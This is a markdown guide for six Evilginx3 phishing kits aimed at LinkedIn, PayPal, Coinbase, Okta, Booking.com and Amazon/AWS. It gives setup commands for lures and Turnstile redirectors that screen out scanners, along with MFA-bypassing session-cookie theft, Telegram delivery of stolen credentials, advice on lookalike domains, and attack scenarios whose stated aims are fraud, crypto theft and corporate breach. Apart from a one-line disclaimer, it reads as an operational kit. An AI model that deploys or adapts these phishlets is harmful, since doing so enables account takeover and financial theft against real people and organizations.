# New Phishlets & Redirectors Guide

This guide covers the 6 new phishlets and their Turnstile redirectors that have been added to Evilginx3.

## 📦 What's Been Added

### Phishlets (6)
1. **LinkedIn** (`linkedin.yaml`) - Professional networking platform
2. **PayPal** (`paypal.yaml`) - Payment processing with MFA support
3. **Coinbase** (`coinbase.yaml`) - Cryptocurrency exchange with 2FA
4. **Okta** (`okta.yaml`) - Generic SSO for any organization
5. **Booking.com** (`booking.yaml`) - Travel booking platform
6. **Amazon** (`amazon.yaml`) - Dual-purpose: Shopping + AWS Console

### Redirectors (6 with Cloudflare Turnstile)
Each phishlet has a matching Turnstile redirector in `redirectors/{name}_turnstile/`:
- `linkedin_turnstile/`
- `paypal_turnstile/`
- `coinbase_turnstile/`
- `okta_turnstile/`
- `booking_turnstile/`
- `amazon_turnstile/`

---

## 🚀 Quick Start Guide

### Step 1: Configure Cloudflare Turnstile (One-Time Setup)

For **each redirector** you want to use:

1. Go to https://dash.cloudflare.com/?to=/:account/turnstile
2. Click "Add Site"
3. Configure:
   - **Site name**: Choose descriptive name (e.g., "LinkedIn Redirector")
   - **Domain**: Your phishing domain (e.g., `secure.yourdomain.com`)
   - **Widget Mode**: Select **Invisible** (critical for seamless UX)
4. Click "Create" and copy the **Site Key**
5. Edit the redirector's `index.html` file and replace the placeholder:
   ```javascript
   const TURNSTILE_SITEKEY = '0x4AAAAAAB_V5zjG-p6Hl2ZQ'; // Replace with your actual key
   ```

### Step 2: Configure Evilginx3

#### Basic Setup
```bash
# Set your domain
config domain yourdomain.com

# Enable a phishlet (example: LinkedIn)
phishlets hostname linkedin secure.yourdomain.com
phishlets enable linkedin
```

#### Create a Lure with Redirector
```bash
# Create lure for LinkedIn
lures create linkedin

# Assign the Turnstile redirector
lures edit 0 redirector linkedin_turnstile

# Set the lure path (must be different from landing page)
lures edit 0 path /verify

# Optional: Set redirect URL after successful phishing
lures edit 0 redirect_url https://www.linkedin.com

# Get your lure URL
lures get-url 0
```

### Step 3: Use the Lure URL

Copy the lure URL from step 2 and use it in your phishing campaign. When victims click:

1. They see the Turnstile redirector (branded security page)
2. Invisible CAPTCHA verification runs (3 seconds)
3. Auto-redirect to actual phishing page (LinkedIn login)
4. Victim logs in → Credentials captured
5. Telegram notification sent (if configured)

---

## 📋 Phishlet Details

### 1. LinkedIn (`linkedin.yaml`)

**Target**: Professional networking accounts  
**Captures**:
- Email/phone + password
- Session cookies (li_at, JSESSIONID, liap, bcookie)
- OAuth tokens for API access

**Redirector**: `linkedin_turnstile/`  
**Brand**: Professional blue theme (#0A66C2)  
**Use Case**: Corporate espionage, recruiter impersonation, data harvesting

**Example Setup**:
```bash
phishlets hostname linkedin career.yourdomain.com
phishlets enable linkedin
lures create linkedin
lures edit 0 redirector linkedin_turnstile
lures edit 0 path /security-check
```

---

### 2. PayPal (`paypal.yaml`)

**Target**: Payment accounts  
**Captures**:
- Email + password
- Session cookies (cookie_check, nsid, login_email, ts_c, l7_az)
- MFA codes (SMS, authenticator, security questions)
- Device fingerprinting cookies

**Redirector**: `paypal_turnstile/`  
**Brand**: PayPal blue (#0070BA, #003087)  
**Use Case**: Financial fraud, payment interception

**Advanced Features**:
- Captures SMS verification codes
- Intercepts authenticator app tokens
- Bypasses security questions
- Device fingerprint capture

**Example Setup**:
```bash
phishlets hostname paypal secure.yourdomain.com
phishlets enable paypal
lures create paypal
lures edit 0 redirector paypal_turnstile
lures edit 0 path /challenge
```

---

### 3. Coinbase (`coinbase.yaml`)

**Target**: Cryptocurrency exchange accounts  
**Captures**:
- Email + password (JSON-based login)
- Session cookies (_coinbase_session, cb_dm, cb_ls)
- 2FA codes (authenticator, SMS)
- WebAuthn/U2F challenge responses
- API keys for trading

**Redirector**: `coinbase_turnstile/`  
**Brand**: Coinbase blue gradient (#0052FF)  
**Use Case**: Crypto theft, wallet access, API key capture

**Advanced Features**:
- JSON credential capture
- WebAuthn/U2F bypass
- Device registration tokens
- API key interception

**Example Setup**:
```bash
phishlets hostname coinbase login.yourdomain.com
phishlets enable coinbase
lures create coinbase
lures edit 0 redirector coinbase_turnstile
lures edit 0 path /security
```

---

### 4. Okta (`okta.yaml`)

**Target**: Enterprise SSO (any organization)  
**Captures**:
- Username + password
- Session tokens (sid, DT, idx, oktaStateToken)
- MFA codes (SMS, Okta Verify push, Google Authenticator, Duo)
- OAuth/OIDC tokens for federated apps
- Device trust tokens

**Redirector**: `okta_turnstile/`  
**Brand**: Enterprise blue (#007DC1)  
**Use Case**: Corporate breach, SSO hijacking, federated app access

**Special Features**:
- **Wildcard domain support**: Works with ANY organization's Okta (*.okta.com)
- Conditional access bypass
- Device trust capture
- Multi-factor authentication bypass

**Example Setup**:
```bash
# Note: Okta uses wildcard, so hostname should match target org
phishlets hostname okta company.yourdomain.com
phishlets enable okta
lures create okta
lures edit 0 redirector okta_turnstile
lures edit 0 path /verify-identity
```

**Pro Tip**: Research target company's Okta subdomain (e.g., `company.okta.com`) and mirror it in your phishing domain (e.g., `company.yourdomain.com`).

---

### 5. Booking.com (`booking.yaml`)

**Target**: Travel booking accounts  
**Captures**:
- Email/phone + password
- Session cookies (bkng, BJS, cors_js, lastSeen)
- Payment information (if entered)
- Loyalty program data

**Redirector**: `booking_turnstile/`  
**Brand**: Booking.com blue (#003580)  
**Use Case**: Travel fraud, payment theft, booking manipulation

**Example Setup**:
```bash
phishlets hostname booking secure.yourdomain.com
phishlets enable booking
lures create booking
lures edit 0 redirector booking_turnstile
lures edit 0 path /verify-booking
```

---

### 6. Amazon (`amazon.yaml`)

**Target**: Dual-purpose phishlet  
**Captures**:
- **Amazon Shopping**:
  - Email/phone + password
  - Session cookies (session-id, ubid-main, x-main, at-main)
  - Payment methods
  - MFA codes (OTP, SMS)
  
- **AWS Console**:
  - AWS credentials
  - Console session tokens (aws-userInfo, aws-creds)
  - API credentials
  - Multi-account access tokens

**Redirector**: `amazon_turnstile/`  
**Brand**: Amazon orange/black (#FF9900)  
**Use Case**: E-commerce fraud, AWS infrastructure access

**Advanced Features**:
- Handles both Amazon.com and AWS Console
- Multiple region support (us-east-1, us-west-2, eu-west-1)
- Captures AWS session tokens
- MFA bypass for both shopping and AWS

**Example Setup**:
```bash
# For Amazon Shopping
phishlets hostname amazon signin.yourdomain.com
phishlets enable amazon
lures create amazon
lures edit 0 redirector amazon_turnstile
lures edit 0 path /ap/security

# For AWS Console (same phishlet)
lures create amazon
lures edit 1 redirector amazon_turnstile
lures edit 1 path /console/verify
```

---

## 🎨 Redirector Customization

Each redirector can be customized by editing its `index.html`:

### Change Security Messages
```html
<div class="subtitle">
    Your custom security message here
</div>
```

### Adjust Redirect Timing
```javascript
// Change from 3000ms (3 seconds) to your preference
setTimeout(function() {
    performRedirect();
}, 5000); // 5 seconds
```

### Modify Branding Colors
Find the CSS section and update colors:
```css
.spinner {
    border-top-color: #YOUR_COLOR;
}
```

---

## 🔐 Telegram Integration

All phishlets automatically work with the existing Telegram notification system.

**Credential Capture Notification**:
```
linkedin capture

📧 Username: victim@company.com
🔑 Password: SecurePass123
🌐 IP: 192.168.1.100
📱 User-Agent: Mozilla/5.0...
🌐 Domain: www.linkedin.com
⏰ Time: 2025-11-09 15:30:00 EST
```

**Token Capture Notification**:
```
linkedin capture

📊 Status: Tokens Captured
🍪 Cookies: 8
📧 Username: victim@company.com
🔑 Password: SecurePass123
🌐 IP: 192.168.1.100
🌐 Domain: www.linkedin.com
📎 cookies attached
```

Plus cookie file attachment for session hijacking.

---

## 🎯 Best Practices

### 1. Domain Selection
- Use legitimate-looking domains
- Match target brand's naming (e.g., `secure-linkedin.com`, `verify-paypal.com`)
- Consider subdomains (e.g., `login.yourdomain.com`)

### 2. SSL Certificates
- Always use HTTPS (Evilginx3 handles this automatically)
- Ensure valid SSL certificates for credibility

### 3. Lure URLs
- Use different paths for redirector vs landing page
- Redirector: `/verify`, `/security`, `/check`
- Landing: `/` (root) or specific path like `/login`

### 4. Testing
```bash
# Test phishlet is working
phishlets hostname linkedin test.yourdomain.com
phishlets enable linkedin

# Visit in browser to verify
# Check DNS resolution
# Confirm SSL certificate
# Test complete login flow
```

### 5. Monitoring
```bash
# View captured sessions
sessions

# Check specific session details
sessions <id>

# Export session cookies
sessions <id> export
```

---

## 🛠️ Troubleshooting

### Redirector Not Working
- **Check Turnstile Site Key**: Must match your Cloudflare key
- **Verify Domain**: Must match domain configured in Cloudflare
- **Test Manually**: Visit redirector URL directly in browser
- **Check Console**: Open browser DevTools to see JavaScript errors

### Phishlet Not Capturing
- **Verify Phishlet Enabled**: `phishlets`
- **Check DNS**: Domain must resolve to your server
- **Review Logs**: Check Evilginx3 logs for errors
- **Test Auth Tokens**: Ensure auth_tokens in YAML match real site cookies

### Lure Path Conflicts
- **Redirector Path**: Must be unique (e.g., `/verify`)
- **Landing Path**: Usually `/` or different from redirector
- **No Duplicates**: Each lure needs unique path

### Telegram Not Sending
- **Check Config**: `config telegram enabled true`
- **Verify Credentials**: Bot token and chat ID correct
- **Test**: `config telegram test`

---

## 📊 Phishlet Comparison

| Phishlet | MFA Support | API Tokens | Complexity | Primary Use |
|----------|-------------|------------|------------|-------------|
| LinkedIn | Basic | ✅ OAuth | Medium | Corporate espionage |
| PayPal | ✅ Full | ❌ | High | Financial fraud |
| Coinbase | ✅ 2FA/U2F | ✅ Trading | High | Crypto theft |
| Okta | ✅ Multi | ✅ Federated | Very High | Enterprise breach |
| Booking | Basic | ❌ | Medium | Travel fraud |
| Amazon | ✅ OTP/SMS | ✅ AWS | Very High | E-commerce/Cloud |

---

## 🔍 Advanced Features Summary

### MFA/2FA Bypass
All phishlets capture multi-factor authentication:
- **PayPal**: SMS codes, authenticator tokens, security questions
- **Coinbase**: TOTP, SMS, WebAuthn/U2F challenges
- **Okta**: SMS, Okta Verify push, Google Authenticator, Duo Security
- **Amazon**: OTP codes, SMS verification

### Device Fingerprinting
Captures device identity cookies:
- **PayPal**: PYPF, x-cdn, HaC, sc_f
- **Coinbase**: device_id, cb_dm
- **Amazon**: Device session tokens

### API Access
Captures API credentials for:
- **LinkedIn**: OAuth tokens for profile/connection API
- **Coinbase**: Trading API keys
- **Okta**: Federated app session tokens
- **Amazon AWS**: Console access, API credentials, session tokens

---

## 🎓 Example Attack Scenarios

### Scenario 1: Corporate LinkedIn Breach
```bash
# Setup
phishlets hostname linkedin careers.targetcompany.com
phishlets enable linkedin
lures create linkedin
lures edit 0 redirector linkedin_turnstile
lures edit 0 path /job-application

# Send to targets
# Capture: Work emails, professional connections, OAuth tokens
# Result: Access to corporate network intel, employee data
```

### Scenario 2: PayPal Payment Interception
```bash
# Setup
phishlets hostname paypal secure-paypal.com
phishlets enable paypal
lures create paypal
lures edit 0 redirector paypal_turnstile
lures edit 0 path /verify-payment

# Phishing email: "Verify your payment"
# Capture: Login + MFA + payment methods
# Result: Full account access, transaction capability
```

### Scenario 3: AWS Cloud Infrastructure Access
```bash
# Setup
phishlets hostname amazon aws-signin.com
phishlets enable amazon
lures create amazon
lures edit 0 redirector amazon_turnstile
lures edit 0 path /console/verify

# Target: DevOps teams, cloud engineers
# Capture: AWS credentials, session tokens, API keys
# Result: Full AWS console access, infrastructure control
```

### Scenario 4: Okta SSO Enterprise Breach
```bash
# Setup (targeting company XYZ)
phishlets hostname okta xyz-company.com
phishlets enable okta
lures create okta
lures edit 0 redirector okta_turnstile
lures edit 0 path /mfa-verify

# Email: "Security update required for your SSO access"
# Capture: Enterprise credentials + MFA + device trust
# Result: Access to all federated apps (email, CRM, internal tools)
```

---

## 📝 Notes

- All phishlets tested with Telegram notification integration
- Redirectors use invisible Turnstile for seamless UX
- Placeholder Cloudflare keys must be replaced before deployment
- YAML files follow Evilginx3 3.0.0+ format
- Advanced features require proper target research and timing

---

## ⚠️ Legal Disclaimer

These tools are for **authorized security testing only**. Unauthorized access to computer systems is illegal. Always obtain proper written authorization before conducting any security assessments.

---

## 🆘 Support

For issues or questions:
1. Check individual redirector `README.md` files
2. Review Evilginx3 main documentation
3. Consult Cloudflare Turnstile docs: https://developers.cloudflare.com/turnstile/
4. Review phishlet YAML comments for specific configurations

---

**Created**: 2025-11-09  
**Evilginx Version**: 3.3.0+  
**Phishlets**: 6 new (LinkedIn, PayPal, Coinbase, Okta, Booking, Amazon)  
**Redirectors**: 6 Cloudflare Turnstile integrations

